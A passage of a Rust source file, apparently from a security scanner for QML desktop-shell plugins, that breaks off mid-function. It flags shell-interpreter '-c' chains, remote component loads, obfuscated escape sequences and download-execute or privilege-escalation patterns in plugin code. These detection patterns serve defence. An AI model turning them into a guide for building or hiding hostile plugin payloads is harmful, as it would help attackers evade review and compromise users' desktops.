//! S3 detectors: capability observation, suspicious-provenance findings, and
//! invocation-edge resolution over an ingested payload inventory.
//!
//! The rule contract separates ability from suspicion: seeing `Process`,
//! `execDetached`, `FileView`, or a network sink records a capability
//! occurrence; emitting a fingerprintable finding requires suspicious
//! provenance — shell-interpreter chains (`sh -c …`), dynamically composed
//! commands, or a network-response-to-execution chain in the same file.
//!
//! Evidence quality follows the build: with the `qml-parser` feature QML is
//! parsed and conclusions are [`Confidence::AstBacked`]; without it — and for
//! standalone `.js` resources, which the QML grammar cannot parse cleanly —
//! detection is line-lexical and labelled [`Confidence::LexicalFallback`] so
//! report consumers can weigh it accordingly (ADR 0001).
//!
//! Nothing here executes scanned content; parsing and scanning are inert.

use std::collections::{BTreeMap, BTreeSet};

use omasafe_core::bounds::{MAX_EVIDENCE_BYTES_PER_RESULT, MAX_FILE_BYTES, MAX_SINK_REJECTIONS};
use omasafe_report::analysis::{
    CapabilityOccurrence, InvocationEdge, ParserMetadata, RenderedFinding,
};

use crate::TimeBudget;
use crate::fingerprint::{Confidence, NormalizedResult};
use crate::payload::{CoverageState, PayloadEntry, PayloadInventory, PayloadKind};
use crate::rules::{Capability, Language, Severity, rule};

/// Everything one analysis pass produced.
#[derive(Debug, Default)]
pub struct AnalysisArtifacts {
    /// Fingerprintable normalized results (suspicious provenance only).
    pub results: Vec<NormalizedResult>,
    /// Ability observations that never assert malicious intent.
    pub capabilities: Vec<CapabilityOccurrence>,
    /// Resolved literal references between analyzed files.
    pub edges: Vec<InvocationEdge>,
    /// Analysis-level disclosures (budget exhaustion, unavailable content).
    pub limitations: Vec<String>,
}

impl AnalysisArtifacts {
    /// Deterministic rendered findings joined with catalog facts. Duplicate
    /// normalized results collapse so repeated sinks render once.
    pub fn rendered_findings(&self) -> Vec<RenderedFinding> {
        let mut seen = std::collections::BTreeSet::new();
        let mut rendered = Vec::new();
        for result in &self.results {
            let key = (
                result.rule_id().to_owned(),
                result.relative_path().to_owned(),
                result.line(),
                result.semantic_value().to_owned(),
            );
            if !seen.insert(key) {
                continue;
            }
            let Some(definition) = rule(result.rule_id()) else {
                continue;
            };
            rendered.push((
                definition.default_severity,
                RenderedFinding {
                    rule_id: definition.id.to_owned(),
                    title: definition.title.to_owned(),
                    severity: definition.default_severity.to_string(),
                    language: definition.language.to_string(),
                    capability: definition.capability.to_string(),
                    relative_path: result.relative_path().to_owned(),
                    line: result.line(),
                    evidence: truncate_bytes(
                        result.semantic_value(),
                        MAX_EVIDENCE_BYTES_PER_RESULT,
                    ),
                    confidence: result.confidence().map(|confidence| match confidence {
                        Confidence::AstBacked => "ast-backed".to_owned(),
                        Confidence::LexicalFallback => "lexical-fallback".to_owned(),
                    }),
                    explanation: definition.summary.to_owned(),
                    review_guidance: definition.review_guidance.to_owned(),
                },
            ));
        }
        // Priority surfaces first: highest severity dominates the report view,
        // with stable path/rule/line ordering within a severity band.
        rendered.sort_by(|(severity_a, finding_a), (severity_b, finding_b)| {
            severity_b.cmp(severity_a).then_with(|| {
                (
                    &finding_a.relative_path,
                    &finding_a.rule_id,
                    finding_a.line,
                    &finding_a.evidence,
                )
                    .cmp(&(
                        &finding_b.relative_path,
                        &finding_b.rule_id,
                        finding_b.line,
                        &finding_b.evidence,
                    ))
            })
        });
        rendered.into_iter().map(|(_, finding)| finding).collect()
    }

    /// Highest finding severity, for `--fail-on` threshold decisions.
    pub fn max_severity(&self) -> Option<Severity> {
        self.results
            .iter()
            .filter_map(|result| rule(result.rule_id()))
            .map(|definition| definition.default_severity)
            .max()
    }
}

/// Parser identity for report embedding; `None` in lexical-fallback builds.
pub fn parser_metadata() -> Option<ParserMetadata> {
    #[cfg(feature = "qml-parser")]
    {
        let identity = crate::qml::qml_parser_identity();
        Some(ParserMetadata {
            grammar: identity.grammar.to_owned(),
            grammar_version: identity.grammar_version.to_owned(),
            tree_sitter_version: identity.tree_sitter_version.to_owned(),
            language_abi_version: identity.language_abi_version,
        })
    }
    #[cfg(not(feature = "qml-parser"))]
    None
}

fn truncate_bytes(value: &str, cap: usize) -> String {
    if value.len() <= cap {
        return value.to_owned();
    }
    let mut end = cap;
    while end > 0 && !value.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}…", &value[..end])
}

/// Run every detector over a fully ingested inventory. `read_content` must
/// return bounded bytes for an entry; entries without a detector are skipped.
///
/// On return the inventory's analyzable entries carry final coverage states:
/// `analyzed` (findings reference them), `partial` (syntax errors degraded the
/// parse), or `unreferenced` (fully analyzed and reachable analysis found
/// nothing). Edge targets gain `referenced = true`.
pub fn analyze_inventory(
    inventory: &mut PayloadInventory,
    read_content: &dyn Fn(&PayloadEntry) -> Option<Vec<u8>>,
    budget: &TimeBudget,
) -> AnalysisArtifacts {
    let mut artifacts = AnalysisArtifacts::default();
    let mut by_path: BTreeMap<String, usize> = BTreeMap::new();
    for (index, entry) in inventory.entries.iter().enumerate() {
        by_path.insert(entry.relative_path.clone(), index);
    }

    struct PendingEdge {
        from_path: String,
        line: u32,
        value: String,
        sink: Option<SinkPosition>,
    }
    let mut pending_edges: Vec<PendingEdge> = Vec::new();

    for index in 0..inventory.entries.len() {
        if budget.expired() {
            artifacts
                .limitations
                .push("analysis_time_budget_exhausted".to_owned());
            break;
        }
        let entry = inventory.entries[index].clone();

        // Plugin manifests feed context results/capabilities (bar kind,
        // headless services). They are not language analysis.
        if entry.relative_path.ends_with("/manifest.json") || entry.relative_path == "manifest.json"
        {
            if entry.size <= MAX_FILE_BYTES {
                if let Some(content) = read_content(&entry) {
                    apply_manifest_context(&content, &entry.relative_path, &mut artifacts);
                } else {
                    artifacts
                        .limitations
                        .push(format!("content_unavailable:{}", entry.relative_path));
                }
            }
            continue;
        }

        let analyzable = matches!(
            entry.kind,
            PayloadKind::Qml | PayloadKind::JavaScript | PayloadKind::Shell | PayloadKind::Python
        );
        if !analyzable
            || !matches!(entry.coverage_state, CoverageState::Unsupported)
            || entry.size > MAX_FILE_BYTES
        {
            continue;
        }
        let Some(content) = read_content(&entry) else {
            artifacts
                .limitations
                .push(format!("content_unavailable:{}", entry.relative_path));
            continue;
        };
        let source = String::from_utf8_lossy(&content).into_owned();

        let entry_kind = entry.kind;
        let mut outcome = match &entry_kind {
            PayloadKind::Qml => analyze_qml_source(&source),
            PayloadKind::JavaScript => analyze_javascript_source(&source),
            kind @ (PayloadKind::Shell | PayloadKind::Python) => {
                let script_kind = kind.clone();
                analyze_script_source(&source, script_kind)
            }
            _ => unreachable!("kinds filtered above"),
        };

        // Anchor results onto the entry's canonical relative path.
        for candidate in &outcome.result_parts {
            if let Ok(normalized) = NormalizedResult::new(
                candidate.rule_id,
                &entry.relative_path,
                candidate.line,
                None,
                candidate.semantic_value.clone(),
                Some(candidate.confidence),
            ) {
                artifacts.results.push(normalized);
            }
        }
        for capability in &mut outcome.capabilities {
            capability.relative_path = entry.relative_path.clone();
            capability.confidence = Some(
                match outcome.confidence {
                    Confidence::AstBacked => "ast-backed",
                    Confidence::LexicalFallback => "lexical-fallback",
                }
                .to_owned(),
            );
        }
        // Decide the coverage state BEFORE draining observations.
        let produced_observations = outcome.has_findings() || !outcome.capabilities.is_empty();
        artifacts.capabilities.append(&mut outcome.capabilities);
        for candidate in outcome.references.drain(..) {
            pending_edges.push(PendingEdge {
                from_path: entry.relative_path.clone(),
                line: candidate.line,
                value: candidate.value,
                sink: candidate.sink,
            });
        }

        // `analyzed` means detectors produced observations (findings or
        // capabilities); `unreferenced` means they ran and saw nothing.
        // Shell/Python are always `partial`: minimal lexical coverage means
        // no match never implies clean behavior. Parse-degraded QML/JS is
        // likewise partial.
        inventory.entries[index].coverage_state =
            if matches!(entry_kind, PayloadKind::Shell | PayloadKind::Python)
                || outcome.parse_degraded
            {
                CoverageState::Partial
            } else if produced_observations {
                CoverageState::Analyzed
            } else {
                CoverageState::Unreferenced
            };
    }

    // Resolve literal references strictly inside the logical root. The loop
    // honors the analysis time budget (H2 review) and retains at most
    // MAX_SINK_REJECTIONS unique typed rejections, disclosing overflow
    // separately instead of expanding limitation strings without bound. The
    // cap is applied to the set of unique strings — deduplication happens as
    // rejections are collected, not after a fixed-size prefix is filled — so a
    // later unique rejection is never crowded out by earlier duplicates, and
    // duplicate-only input never reports truncation.
    let mut resolved: Vec<InvocationEdge> = Vec::new();
    let mut sink_rejections: BTreeSet<String> = BTreeSet::new();
    let mut sink_rejections_omitted = 0usize;
    for edge in pending_edges {
        if budget.expired() {
            let disclosed = artifacts
                .limitations
                .iter()
                .any(|limitation| limitation == "analysis_time_budget_exhausted");
            if !disclosed {
                artifacts
                    .limitations
                    .push("analysis_time_budget_exhausted".to_owned());
            }
            break;
        }
        let Some(target_index) =
            resolve_reference(inventory, &by_path, &edge.from_path, &edge.value)
        else {
            // Rejected references are disclosed only for verified sink
            // positions, with a typed reason (R-2). Non-sink path-shaped
            // strings stay inventory context, exactly as before.
            if edge.sink.is_some() {
                let rejection = format!(
                    "sink-reference-rejected:{}:{}:{}:{}",
                    rejection_reason(&edge.value),
                    edge.from_path,
                    edge.line,
                    edge.value
                );
                // A rejection already disclosed verbatim (retained in the
                // set) carries no new information. A rejection that cannot
                // be retained because the set is full is omitted: every such
                // occurrence is counted, because remembering WHICH values
                // were omitted would need unbounded fingerprints under
                // adversarial input — the truncation count is deliberately
                // an occurrence count, never a unique count (H2 review).
                if sink_rejections.contains(&rejection) {
                    // Already disclosed.
                } else if sink_rejections.len() < MAX_SINK_REJECTIONS {
                    sink_rejections.insert(rejection);
                } else {
                    sink_rejections_omitted += 1;
                }
            }
            continue;
        };
        inventory.entries[target_index].invocation_target = true;
        resolved.push(InvocationEdge {
            from_path: edge.from_path,
            line: Some(edge.line),
            target_path: inventory.entries[target_index].relative_path.clone(),
        });
    }
    // BTreeSet already yields sorted, unique strings.
    artifacts.limitations.extend(sink_rejections);
    if sink_rejections_omitted > 0 {
        artifacts.limitations.push(format!(
            "sink-reference-rejections-truncated:{sink_rejections_omitted}"
        ));
    }
    resolved.sort_by(|a, b| (&a.from_path, &a.target_path).cmp(&(&b.from_path, &b.target_path)));
    resolved.dedup_by(|a, b| a.from_path == b.from_path && a.target_path == b.target_path);
    artifacts.edges = resolved;

    artifacts.capabilities.sort_by(|a, b| {
        (&a.capability, &a.relative_path, a.line, &a.detail).cmp(&(
            &b.capability,
            &b.relative_path,
            b.line,
            &b.detail,
        ))
    });
    artifacts.capabilities.dedup_by(|a, b| {
        a.capability == b.capability
            && a.relative_path == b.relative_path
            && a.line == b.line
            && a.detail == b.detail
    });

    artifacts
}

/// Resolve one literal reference against the inventory: plain relative paths
/// to inventoried files only — never traversal segments, schemes, absolute
/// paths, directories, or symlinks. Any bundled file can be an invocation
/// target (`Loader` sources, `FileView` paths, script payloads alike); the
/// existence check against the inventory is what keeps ordinary prose out.
/// Cheap path-likeness prefilter; the inventory existence check in
/// [`resolve_reference`] is the real gate.
fn is_path_shaped(value: &str) -> bool {
    if value.is_empty() || value.len() > 512 {
        return false;
    }
    value.contains('/') || (value.contains('.') && !value.contains(' '))
}

fn resolve_reference(
    inventory: &PayloadInventory,
    by_path: &BTreeMap<String, usize>,
    from_path: &str,
    value: &str,
) -> Option<usize> {
    if value.is_empty()
        || value.len() > 512
        || value.starts_with('/')
        || value.contains(':')
        || value.contains(' ')
        || value.contains('\n')
    {
        return None;
    }
    // Leading "./" is ordinary relative spelling; only inner traversal
    // segments are hostile.
    let stripped = value.trim_start_matches("./");
    if stripped.is_empty()
        || stripped
            .split('/')
            .any(|segment| segment == "." || segment == "..")
    {
        return None;
    }
    // QML/JS references resolve relative to the referencing file first;
    // repository-root-relative spellings are the fallback.
    let mut candidate_paths: Vec<String> = Vec::new();
    if let Some((directory, _file)) = from_path.rsplit_once('/') {
        candidate_paths.push(format!("{}/{}", directory, stripped));
    }
    candidate_paths.push(stripped.to_owned());
    for candidate in candidate_paths {
        if let Some(index) = by_path.get(candidate.as_str()) {
            if matches!(
                inventory.entries[*index].kind,
                PayloadKind::Symlink | PayloadKind::Directory | PayloadKind::Special
            ) {
                return None;
            }
            return Some(*index);
        }
    }
    None
}

/// Verified sink positions for reference candidates (H2). A path-shaped
/// string at one of these positions is a real load or execution input, so a
/// failed in-tree resolution is disclosed with a typed reason; path-shaped
/// strings anywhere else stay inventory context (R-2).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SinkPosition {
    LoaderSource,
    CreateComponent,
    Include,
    ProcessCommand,
    ExecDetached,
    FileViewPath,
}

impl SinkPosition {
    fn label(self) -> &'static str {
        match self {
            SinkPosition::LoaderSource => "Loader.source",
            SinkPosition::CreateComponent => "Qt.createComponent",
            SinkPosition::Include => "Qt.include",
            SinkPosition::ProcessCommand => "Process.command",
            SinkPosition::ExecDetached => "execDetached",
            SinkPosition::FileViewPath => "FileView.path",
        }
    }
}

/// One reference candidate collected during per-file analysis. `sink` marks
/// verified sink positions; unmarked candidates are inventory context only.
#[derive(Debug, Clone, PartialEq, Eq)]
struct ReferenceCandidate {
    line: u32,
    value: String,
    sink: Option<SinkPosition>,
}

/// Centralized scheme parsing for reference classification (H2 review):
/// URI schemes are case-insensitive (RFC 3986), so `HTTPS://…` must reach
/// the same verdict as its lowercase spelling, and one parser feeds rejection
/// reasons, the remote-load family, and the out-of-tree family so the three
/// can never disagree about the same literal. The remote set is the network
/// transports Qt's component loader accepts on the pinned runtime; `file`
/// denotes a local path, so it is an out-of-tree load, never remote.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SchemeClass {
    Remote,
    LocalFile,
    Other,
}

fn scheme_class(value: &str) -> Option<SchemeClass> {
    let position = value.find(':')?;
    let scheme = &value[..position];
    let mut chars = scheme.chars();
    if !chars
        .next()
        .is_some_and(|first| first.is_ascii_alphabetic())
    {
        return None;
    }
    if !chars.all(|char| char.is_ascii_alphanumeric() || matches!(char, '+' | '-' | '.')) {
        return None;
    }
    if scheme.eq_ignore_ascii_case("http") || scheme.eq_ignore_ascii_case("https") {
        return Some(SchemeClass::Remote);
    }
    if scheme.eq_ignore_ascii_case("file") {
        return Some(SchemeClass::LocalFile);
    }
    Some(SchemeClass::Other)
}

/// Typed reason a reference cannot resolve in-tree, mirroring
/// [`resolve_reference`]'s rejection conditions so reports can triage it
/// (R-2): `remote`, `absolute`, `traversal`, `missing-local-target`,
/// `unsupported-scheme`. A `file://` URL names a local path outside the
/// tree, so its reason is `absolute`.
fn rejection_reason(value: &str) -> &'static str {
    match scheme_class(value) {
        Some(SchemeClass::Remote) => return "remote",
        Some(SchemeClass::LocalFile) => return "absolute",
        Some(SchemeClass::Other) => return "unsupported-scheme",
        None => {}
    }
    if value.starts_with('/') {
        return "absolute";
    }
    // Leading "./" is ordinary relative spelling; only inner traversal
    // segments are hostile (same rule as resolve_reference).
    let stripped = value.trim_start_matches("./");
    if stripped
        .split('/')
        .any(|segment| segment == "." || segment == "..")
    {
        return "traversal";
    }
    "missing-local-target"
}

/// Absolute-path, traversal, or `file://` spelling: content from outside the
/// reviewed plugin tree. Leading "./" is ordinary relative spelling, not
/// traversal.
fn is_out_of_tree_spelling(value: &str) -> bool {
    if value.starts_with('/') {
        return true;
    }
    if matches!(scheme_class(value), Some(SchemeClass::LocalFile)) {
        return true;
    }
    value
        .trim_start_matches("./")
        .split('/')
        .any(|segment| segment == "..")
}

/// Decode JS/QML string escape sequences so sink classification sees the
/// value the runtime evaluates: `"\x68ttps://…"` loads `https://…`, so
/// escaped literals must not slip past scheme detection (H2 review). Applies
/// exactly once, at string extraction; classification and evidence carry the
/// decoded runtime value. Unknown escapes decode to the escaped character
/// (JS semantics); a trailing backslash stays literal.
fn decode_js_escapes(content: &str) -> String {
    if !content.contains('\\') {
        return content.to_owned();
    }
    let mut decoded = String::with_capacity(content.len());
    let mut chars = content.chars().peekable();
    while let Some(current) = chars.next() {
        if current != '\\' {
            decoded.push(current);
            continue;
        }
        let Some(&next) = chars.peek() else {
            decoded.push('\\');
            break;
        };
        match next {
            // Line-continuation: backslash + LineTerminatorSequence evaluates
            // to the empty string, so `"ht\<LF>tps://…"` is `https://…` at
            // runtime. A CR + LF pair is a single terminator sequence.
            '\n' | '\u{2028}' | '\u{2029}' => {
                chars.next();
            }
            '\r' => {
                chars.next();
                if chars.peek() == Some(&'\n') {
                    chars.next();
                }
            }
            // Legacy octal escape (Annex B): backslash + 1–3 octal digits.
            // The first digit bounds the length — 0–3 allow three digits,
            // 4–7 only two — so `\1` is U+0001 and `\101` is 'A'. `\0` not
            // followed by an octal digit is NUL. `\8`/`\9` are not octal and
            // fall through to the identity arm below.
            '0'..='7' => {
                chars.next();
                let mut octal = String::new();
                octal.push(next);
                let max = if next <= '3' { 3 } else { 2 };
                while octal.len() < max
                    && chars.peek().is_some_and(|char| ('0'..='7').contains(char))
                {
                    octal.push(chars.next().unwrap());
                }
                let value = u32::from_str_radix(&octal, 8).unwrap_or(0);
                decoded.push(char::from_u32(value).unwrap_or('\u{FFFD}'));
            }
            'n' | 'r' | 't' | 'b' | 'f' | 'v' => {
                decoded.push(match next {
                    'n' => '\n',
                    'r' => '\r',
                    't' => '\t',
                    'b' => '\u{0008}',
                    'f' => '\u{000C}',
                    _ => '\u{000B}',
                });
                chars.next();
            }
            'x' => {
                chars.next();
                let mut hex = String::new();
                while hex.len() < 2 && chars.peek().is_some_and(|char| char.is_ascii_hexdigit()) {
                    hex.push(chars.next().unwrap());
                }
                if hex.len() == 2 {
                    let value = u32::from_str_radix(&hex, 16).unwrap_or(0);
                    decoded.push(char::from_u32(value).unwrap_or('\u{FFFD}'));
                } else {
                    decoded.push_str("\\x");
                    decoded.push_str(&hex);
                }
            }
            'u' => {
                chars.next();
                if chars.peek() == Some(&'{') {
                    chars.next();
                    let mut hex = String::new();
                    while hex.len() < 6 && chars.peek().is_some_and(|char| char.is_ascii_hexdigit())
                    {
                        hex.push(chars.next().unwrap());
                    }
                    if chars.peek() == Some(&'}')
                        && let Some(value) =
                            u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32)
                    {
                        chars.next();
                        decoded.push(value);
                    } else {
                        decoded.push_str("\\u{");
                        decoded.push_str(&hex);
                    }
                } else {
                    let mut hex = String::new();
                    while hex.len() < 4 && chars.peek().is_some_and(|char| char.is_ascii_hexdigit())
                    {
                        hex.push(chars.next().unwrap());
                    }
                    if hex.len() == 4 {
                        let value = u32::from_str_radix(&hex, 16).unwrap_or(0);
                        decoded.push(char::from_u32(value).unwrap_or('\u{FFFD}'));
                    } else {
                        decoded.push_str("\\u");
                        decoded.push_str(&hex);
                    }
                }
            }
            '\'' | '"' | '`' | '\\' | '/' => {
                decoded.push(next);
                chars.next();
            }
            // Unknown escape: JS keeps the escaped character, drops the
            // backslash.
            other => {
                decoded.push(other);
                chars.next();
            }
        }
    }
    decoded
}

/// Findings for literals at load sinks (H2). Network schemes at the two
/// verified reachable load positions (H0 record) are the High
/// remote-component-load family; absolute/traversal spellings at load sinks
/// are unreviewed out-of-tree loads (Medium) — not sandbox escapes. Plain
/// relative spellings carry no finding: they resolve as inventory edges or
/// surface a typed rejection.
fn load_sink_finding(
    value: &str,
    sink: SinkPosition,
    line: u32,
    confidence: Confidence,
) -> Option<ResultParts> {
    let remote = matches!(scheme_class(value), Some(SchemeClass::Remote));
    if remote
        && matches!(
            sink,
            SinkPosition::LoaderSource | SinkPosition::CreateComponent
        )
    {
        return Some(parts(
            REMOTE_COMPONENT_LOAD_RULE,
            line,
            format!("remote-component-load:{}:{value}", sink.label()),
            confidence,
        ));
    }
    if matches!(
        sink,
        SinkPosition::LoaderSource | SinkPosition::CreateComponent | SinkPosition::Include
    ) && is_out_of_tree_spelling(value)
    {
        return Some(parts(
            OUT_OF_TREE_REFERENCE_RULE,
            line,
            format!("out-of-tree-reference:{}:{value}", sink.label()),
            confidence,
        ));
    }
    None
}

/// Record one sink-position literal: a load-sink finding when the spelling
/// carries one, otherwise a sink-marked reference candidate for in-tree
/// resolution (edge or typed rejection).
fn record_sink_reference(text: &str, sink: SinkPosition, line: u32, outcome: &mut FileOutcome) {
    if let Some(finding) = load_sink_finding(text, sink, line, outcome.confidence) {
        outcome.result_parts.push(finding);
        return;
    }
    if is_path_shaped(text) {
        outcome.references.push(ReferenceCandidate {
            line,
            value: text.to_owned(),
            sink: Some(sink),
        });
    }
}

/// Directory-import specifier handling, shared by the AST and lexical paths
/// (H2). Remote schemes record the verified-scanner-intercepted indicator —
/// never the High remote-load family; absolute/traversal spellings are
/// reachable local out-of-tree loads and carry the Medium finding. Plain
/// relative imports are ordinary QML and stay silent.
fn apply_directory_import(specifier: &str, line: u32, outcome: &mut FileOutcome) {
    let remote = matches!(scheme_class(specifier), Some(SchemeClass::Remote));
    if remote {
        outcome.result_parts.push(parts(
            REMOTE_DIRECTORY_IMPORT_RULE,
            line,
            format!("remote-directory-import:{specifier}"),
            outcome.confidence,
        ));
        return;
    }
    if is_out_of_tree_spelling(specifier) {
        outcome.result_parts.push(parts(
            OUT_OF_TREE_REFERENCE_RULE,
            line,
            format!("out-of-tree-reference:directory-import:{specifier}"),
            outcome.confidence,
        ));
    }
}

/// Per-file detector output before cross-file anchoring.
struct FileOutcome {
    result_parts: Vec<ResultParts>,
    capabilities: Vec<CapabilityOccurrence>,
    references: Vec<ReferenceCandidate>,
    parse_degraded: bool,
    confidence: Confidence,
}

impl FileOutcome {
    fn has_findings(&self) -> bool {
        !self.result_parts.is_empty()
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SinkKind {
    Process,
    DetachedExecution,
}

const PROCESS_RULE: &str = "oma.qml.process-execution";
const DETACHED_RULE: &str = "oma.qml.detached-execution";
#[cfg_attr(not(test), allow(dead_code))]
const NETWORK_RULE: &str = "oma.qml.network-access";
#[cfg(feature = "qml-parser")]
const DYNAMIC_REFERENCE_RULE: &str = "oma.qml.dynamic-reference";
#[cfg_attr(not(test), allow(dead_code))]
const DYNAMIC_CODE_RULE: &str = "oma.qml.dynamic-code";
#[cfg_attr(not(test), allow(dead_code))]
const OBFUSCATION_RULE: &str = "oma.qml.obfuscated-payload-indicator";
const PERSISTENCE_RULE: &str = "oma.qml.persistence-scheduling";
const REMOTE_COMPONENT_LOAD_RULE: &str = "oma.qml.remote-component-load";
const REMOTE_DIRECTORY_IMPORT_RULE: &str = "oma.qml.remote-directory-import";
const OUT_OF_TREE_REFERENCE_RULE: &str = "oma.qml.out-of-tree-reference";
const SCRIPT_DOWNLOAD_EXECUTE_RULE: &str = "oma.script.download-execute";
const SCRIPT_PRIVILEGE_RULE: &str = "oma.script.privilege-escalation";
const PYTHON_DOWNLOAD_EXECUTE_RULE: &str = "oma.python.download-execute";
const PYTHON_PRIVILEGE_RULE: &str = "oma.python.privilege-escalation";
const REPLACES_BAR_RULE: &str = "oma.context.replaces-bar";

struct LexFlags {
    detached_any: Option<u32>,
    network: Option<u32>,
}

fn parts(
    rule_id: &'static str,
    line: u32,
    semantic_value: impl Into<String>,
    confidence: Confidence,
) -> ResultParts {
    ResultParts {
        rule_id,
        line: Some(line),
        semantic_value: truncate_bytes(&semantic_value.into(), MAX_EVIDENCE_BYTES_PER_RESULT),
        confidence,
    }
}

fn occurrence(
    capability: Capability,
    language: Language,
    line: u32,
    detail: &str,
) -> CapabilityOccurrence {
    // Script-language capability context has no dedicated catalog rule yet;
    // attributing it to QML rules would produce misleading guidance.
    let covering_rule = if matches!(language, Language::Shell | Language::Python) {
        None
    } else {
        capability_covering_rule(capability)
    }
    .and_then(crate::rules::rule);
    CapabilityOccurrence {
        capability: capability.to_string(),
        language: language.to_string(),
        relative_path: String::new(),
        line: Some(line),
        source_rule_id: covering_rule.map(|definition| definition.id.to_owned()),
        detail: truncate_bytes(detail, 200),
        confidence: None,
        explanation: covering_rule
            .map(|definition| definition.summary.to_owned())
            .unwrap_or_else(|| {
                "script capability observed; lexical coverage is minimal by design".to_owned()
            }),
        review_guidance: covering_rule
            .map(|definition| definition.review_guidance.to_owned())
            .unwrap_or_else(|| "Review the surrounding script manually".to_owned()),
    }
}

fn capability_covering_rule(capability: Capability) -> Option<&'static str> {
    match capability {
        Capability::ProcessExecution => Some("oma.qml.process-execution"),
        Capability::DetachedProcessExecution => Some("oma.qml.detached-execution"),
        Capability::FilesystemAccess => Some("oma.qml.filesystem-access"),
        Capability::NetworkAccess => Some("oma.qml.network-access"),
        Capability::PersistenceScheduling => Some(PERSISTENCE_RULE),
        Capability::ClipboardAccess => Some("oma.qml.clipboard-access"),
        Capability::CompositorControl => Some("oma.qml.compositor-control"),
        Capability::PolkitAgentUi => Some("oma.qml.polkit-agent-ui"),
        Capability::SessionLockSurface => Some("oma.qml.session-lock"),
        Capability::PamAuthentication => Some("oma.qml.pam-authentication"),
        Capability::DynamicCodeExecution => Some(DYNAMIC_CODE_RULE),
        _ => None,
    }
}

/// Shell-interpreter invocation inside a command string: an interpreter word
/// followed (after whitespace) by a `-c`-style flag. Returns the byte offset
/// of the interpreter word for evidence trimming.
fn find_shell_interpreter(text: &str) -> Option<usize> {
    const INTERPRETERS: [&str; 6] = ["sh", "bash", "zsh", "dash", "ksh", "ash"];
    let bytes = text.as_bytes();
    let mut position = 0usize;
    while position < bytes.len() {
        // Advance to the next word start; path separators stay inside words
        // so `/bin/sh -c` scans as basename `sh`.
        while position < bytes.len()
            && !bytes[position].is_ascii_alphanumeric()
            && bytes[position] != b'/'
        {
            position += 1;
        }
        if position >= bytes.len() {
            break;
        }
        let start = position;
        while position < bytes.len()
            && (bytes[position].is_ascii_alphanumeric() || bytes[position] == b'/')
        {
            position += 1;
        }
        let word = &text[start..position];
        let basename = word.rsplit('/').next().unwrap_or(word);
        if INTERPRETERS.contains(&basename) {
            // Skip whitespace, then require a `-c…` style flag.
            let mut cursor = position;
            while cursor < bytes.len() && (bytes[cursor] == b' ' || bytes[cursor] == b'\t') {
                cursor += 1;
            }
            if cursor + 1 < bytes.len()
                && bytes[cursor] == b'-'
                && bytes[cursor + 1] == b'c'
                && (cursor + 2 == bytes.len()
                    || bytes[cursor + 2] == b' '
                    || bytes[cursor + 2] == b'\t')
            {
                return Some(start);
            }
        }
        // Skip past this word even when it did not match.
        while position < bytes.len() && bytes[position] != b' ' {
            position += 1;
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Lexical analysis: standalone .js always, and all QML in fallback builds.
// ---------------------------------------------------------------------------

fn lexical_scan(source: &str, language: Language) -> FileOutcome {
    let mut outcome = FileOutcome {
        result_parts: Vec::new(),
        capabilities: Vec::new(),
        references: Vec::new(),
        parse_degraded: false,
        confidence: Confidence::LexicalFallback,
    };
    let mut flags = LexFlags {
        detached_any: None,
        network: None,
    };

    for (index, raw_line) in source.lines().enumerate() {
        let number = index as u32 + 1;
        // One shared quote-aware trim: commented-out code is invisible to
        // every detector below, while quoted text survives intact.
        let line = strip_line_comment(raw_line, CommentStyle::DoubleSlash);
        if line.is_empty() {
            continue;
        }
        // Every occurrence gets its own argument judgment: a benign first
        // call must not mask a suspicious later one.
        let mut search_from = 0usize;
        while let Some(relative_offset) = find_word(&line[search_from..], "execDetached") {
            let offset = search_from + relative_offset;
            search_from = offset + "execDetached".len();
            flags.detached_any.get_or_insert(number);
            outcome.capabilities.push(occurrence(
                Capability::DetachedProcessExecution,
                language,
                number,
                &line[offset..],
            ));
            // The call's own paren: first '(' after the name, skipping only
            // whitespace.
            let mut cursor = search_from;
            while cursor < line.len() && matches!(line.as_bytes()[cursor], b' ' | b'\t') {
                cursor += 1;
            }
            if cursor < line.len()
                && line.as_bytes()[cursor] == b'('
                && let Some((start, end)) = balanced_bracket_span(line, cursor)
            {
                evaluate_execution_span(
                    &line[start..end],
                    SinkKind::DetachedExecution,
                    number,
                    &mut outcome,
                );
                // The executed path is also a reference sink (H2): literals
                // inside the argument span only, never the whole line.
                for literal in span_sink_literals(&line[start..end]) {
                    record_sink_reference(
                        &literal,
                        SinkPosition::ExecDetached,
                        number,
                        &mut outcome,
                    );
                }
            }
        }
        let is_network_line = line.contains("new XMLHttpRequest")
            || find_word(line, "fetch(").is_some()
            || line.contains("WebSocket");
        if is_network_line {
            flags.network.get_or_insert(number);
            outcome.capabilities.push(occurrence(
                Capability::NetworkAccess,
                language,
                number,
                line.trim(),
            ));
        }
        if find_word(line, "FileView").is_some() {
            outcome.capabilities.push(occurrence(
                Capability::FilesystemAccess,
                language,
                number,
                line.trim(),
            ));
        }
        if find_word(line, "Timer").is_some() {
            outcome.capabilities.push(occurrence(
                Capability::PersistenceScheduling,
                language,
                number,
                line.trim(),
            ));
        }
        if find_word(line, "Process").is_some() {
            // Every `command` binding gets its own judgment; the line is
            // already comment-trimmed by strip_line_comment.
            let mut search_from = 0usize;
            while let Some(relative_offset) = find_word(&line[search_from..], "command") {
                let word = search_from + relative_offset;
                search_from = word + "command".len();
                outcome.capabilities.push(occurrence(
                    Capability::ProcessExecution,
                    language,
                    number,
                    line.trim(),
                ));
                // Suspicious provenance only, judged on the binding value:
                // shell-interpreter chains or network response data. Command
                // argv is also a verified sink position (H2): literal
                // arguments inside the binding value span only — a bare
                // `command` identifier on a Process-free line never
                // participates.
                if let Some((start, end)) = binding_value_span(line, search_from) {
                    evaluate_execution_span(
                        &line[start..end],
                        SinkKind::Process,
                        number,
                        &mut outcome,
                    );
                    for literal in span_sink_literals(&line[start..end]) {
                        record_sink_reference(
                            &literal,
                            SinkPosition::ProcessCommand,
                            number,
                            &mut outcome,
                        );
                    }
                }
            }
        }
        // Priority surfaces (lexical parity with the AST path).
        if find_word(line, "Polkit").is_some() {
            outcome.result_parts.push(parts(
                "oma.qml.polkit-agent-ui",
                number,
                "polkit-surface",
                Confidence::LexicalFallback,
            ));
        }
        if find_word(line, "PamContext").is_some() || line.contains("Services.Pam") {
